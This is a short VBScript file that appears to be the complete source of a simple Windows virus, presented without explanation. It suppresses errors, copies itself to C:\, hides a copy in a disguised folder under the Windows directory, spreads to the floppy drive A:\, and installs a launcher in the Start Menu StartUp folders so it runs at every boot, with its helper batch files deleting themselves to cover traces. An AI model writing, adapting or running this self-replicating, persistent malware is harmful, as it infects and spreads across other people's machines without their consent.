On Error Resume Next
dim fso, wsh, dosfile, openvir, copyov
set fso = createobject("scripting.filesystemobject")
set wsh = wscript.createobject ("wscript.shell")
fso.CopyFile Wscript.ScriptFullName, "C:\viruz.vbs", True 
set dosfile = fso.createtextfile ("c:\dosfile.bat", true)
dosfile.writeline ("@echo off")
dosfile.writeline ("cd %windir%")
dosfile.writeline ("md ųų")
dosfile.writeline ("cd ųų")
dosfile.writeline ("copy C:\viruz.vbs viruz.vbs")
dosfile.writeline ("command /f /c copy C:\viruz.vbs A:\")
dosfile.writeline ("del C:\viruz.vbs")
dosfile.writeline ("del %0")
dosfile.close
wsh.run "C:\dosfile.bat"
set openvir = fso.createtextfile ("C:\openvir.bat", true)
openvir.writeline ("@echo off")
openvir.writeline ("cd %windir%")
openvir.writeline ("cd ųų")
openvir.writeline ("cscript viruz.vbs")
openvir.close
set copyov = fso.createtextfile ("C:\copyov.bat", true)
copyov.writeline ("@echo off")
copyov.writeline ("copy C:\openvir.bat %windir%\Startm~1\Programs\StartUp\winst.bat")
copyov.Writeline ("copy C:\openvir.bat %windir%\startm~1\progra~1\autost~1\winst.bat")
copyov.Writeline ("del C:\openvir.bat")
copyov.Writeline ("del %0")
copyov.close
wsh.run "C:\copyov.bat"
